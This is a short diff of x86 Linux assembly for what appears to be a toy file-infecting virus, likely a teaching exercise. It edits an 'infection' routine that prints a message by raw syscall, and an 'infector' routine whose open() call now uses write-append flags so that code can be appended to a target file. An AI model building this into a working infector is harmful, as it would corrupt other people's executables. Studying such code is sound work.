@@ -50,17 +50,19 @@ code_start:
 infection:
     push    ebp             ; Save caller state
     mov     ebp, esp
+    pushad
     mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
     and     eax, 1
     cmp     eax, 1
     je      L1
-    push    dword 22
-    push    infection_string
-    push    dword 1
-    push    dword 4
-    call    system_call
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, infection_string
+    mov edx, 20
+    int 0x80
+
 L1:
-    add     esp, 16
+    popad
     mov esp, ebp
     pop ebp
     ret
@@ -73,7 +75,7 @@ infector:
     pushad
     mov eax, 5
     mov ebx, [ebp+8]
-    mov ecx, 2
+    mov ecx, 1025
     mov edx, 0777
     int 0x80
 
